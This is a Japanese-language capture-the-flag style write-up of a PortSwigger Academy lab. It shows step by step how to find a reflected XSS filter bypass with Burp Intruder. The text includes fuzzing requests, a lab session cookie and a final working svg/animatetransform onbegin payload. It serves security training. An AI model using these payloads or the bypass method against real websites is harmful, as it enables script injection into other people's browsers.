# 一部の SVG マークアップを使用したリフレクト XSS が許可される

次のハッキングラボを実施します  
このラボには単純な反映型 XSS 脆弱性があります。このサイトは一般的なタグをブロックしていますが、一部の SVG タグとイベントが欠落しています。  
https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed

- 1. BurpSuite を起動して、Proxy タブからブラウザを起動

* 2. ハッキングラボにアクセスします
* 3. 検索窓に以下を入力して検索すると怒られます

```html
<img src="1" onerror="alert(1)" />
```

結果

```
"Tag is not allowed"
```

- 4. GET /?search=%3Cimg+src%3D1+onerror%3Dalert%281%29%3E HTTP/1.1 リクエストを send to intruder します

- 5. Intruder タブのリクエストを以下のように書き換えます

```
GET /?search=<§§> HTTP/1.1
Host: 0a3e00790482510480ef5def004f0011.h1-web-security-academy.net
Cookie: session=Gc2wgmH4g7xLcjJeVsSlW4cEPCvKEnN6
Sec-Ch-Ua:
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: ""
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a3e00790482510480ef5def004f0011.h1-web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8
Connection: close
```

- 6. チートシートにアクセスして、Copy tags to Clipboard ボタンを押します  
     https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

- 7. Payload に張り付けて攻撃を開始します

     ![1](https://github.com/pea-sys/web-security-experiments/assets/49807271/fd457bbf-5400-4d62-9ef2-c0a7e21c1a16)

animatetransform, image, svg, title タグはブロックされていません

- 8. 続けてリクエストを以下のように書き換えます

```
GET /?search=<svg><animatetransform%20§§=1> HTTP/1.1
Host: 0a3e00790482510480ef5def004f0011.h1-web-security-academy.net
Cookie: session=Gc2wgmH4g7xLcjJeVsSlW4cEPCvKEnN6
Sec-Ch-Ua:
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: ""
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a3e00790482510480ef5def004f0011.h1-web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8
Connection: close
```

- 9.  チートシートにアクセスして、Copy tags to Clipboard ボタンを押します  
      https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

* 10. Payload に張り付けて攻撃を開始します
      ![2](https://github.com/pea-sys/web-security-experiments/assets/49807271/da5e1488-550d-40b5-add4-810c34501867)

onbegin イベントがブロックされていません

- 11. 検索結果を表示するページの search パラメータを%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E に変更するとスクリプトが実行できます。
